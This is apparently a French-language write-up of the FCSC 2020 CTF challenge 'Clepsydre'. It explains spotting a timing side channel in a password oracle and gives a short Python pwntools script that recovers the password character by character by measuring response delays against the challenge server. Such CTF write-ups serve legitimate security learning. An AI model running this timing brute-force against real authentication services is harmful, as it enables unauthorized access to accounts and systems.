---
title: "Clepsydre"
subtitle: "Challenge de Misc du FCSC 2020"
published: true
author: "Bdenneu"
ctf: "FCSC"
annee: "2020"
---

# L'énoncé

À l'origine, la clepsydre est un instrument à eau qui permet de définir la durée d'un évènement, la durée d'un discours par exemple. On contraint la durée de l’évènement au temps de vidage d'une cuve contenant de l'eau qui s'écoule par un petit orifice. Dans l'exemple du discours, l'orateur doit s'arrêter quand le récipient est vide. La durée visualisée par ce moyen est indépendante d'un débit régulier du liquide ; le récipient peut avoir n'importe quelle forme. L'instrument n'est donc pas une horloge hydraulique (Wikipedia).

Service : nc challenges2.france-cybersecurity-challenge.fr 6006

# Qu'est ce qu'on a là ?

On se retrouve devant un oracle qui nous demande un mot de passe. Une citation est même donnée sur la patience. On peut penser à une time based attack.

![](/assets/images/FCSC2020/Clepsydre/1.png)

Au final, en mettant la citation en mot de passe, le temps de réponse est plus long. Tentons le bruteforce:

```python

from pwn import *
from string import printable
import time

alphabet = string.printable
passwd = ""
while 1:
    for i in alphabet:
        print(i)
        r = remote('challenges2.france-cybersecurity-challenge.fr', 6006, level="error")
        r.recv()
        r.sendline(passwd+i)
        start = time.time()
        data = r.recv()
        if int(time.time()-start) == len(passwd)+1:
            passwd += i
            print("Found: ",passwd)
            print(data)
            r.close()
            break
    r.close()

```

# Flag

![](/assets/images/FCSC2020/Clepsydre/2.png)


